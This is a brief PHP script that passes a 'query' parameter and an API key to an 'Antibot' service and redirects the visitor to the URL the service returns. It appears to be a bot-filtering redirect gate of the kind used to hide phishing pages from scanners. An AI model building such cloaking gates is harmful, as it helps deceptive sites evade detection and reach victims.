<?php
require_once('autoload.php');

if($_GET['query']){
    $respons = $Antibot->redirect( $config['apikey'] , $_GET['query']);
    $json    = $Antibot->json($respons);
    if($json['status'] == false){
        $Antibot->error(100 , $json['message']);
    }
    if(empty($json['direct_url'])){
        $Antibot->error(404);
    }
    die(header("Location: ".$json['direct_url']));
}else{
    $Antibot->error(404);
}
